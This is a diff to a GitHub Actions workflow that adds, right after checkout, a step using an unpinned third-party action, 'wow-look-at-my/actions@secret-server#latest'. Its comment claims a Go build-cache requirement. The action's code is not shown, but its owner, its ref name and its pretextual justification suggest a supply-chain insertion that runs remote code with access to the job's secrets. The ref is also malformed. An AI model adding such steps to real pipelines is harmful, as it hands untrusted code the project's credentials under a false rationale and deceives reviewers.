@@ -675,6 +675,8 @@ jobs:
         uses: actions/checkout@v4
         with:
           submodules: true
+      # make.bash fails a CI run with no shared cache configured; this step exports GO_BUILDCACHE_CONFIG.
+      - uses: wow-look-at-my/actions@secret-server#latest
 
       - name: Setup Go bootstrap toolchain
         uses: actions/setup-go@v5
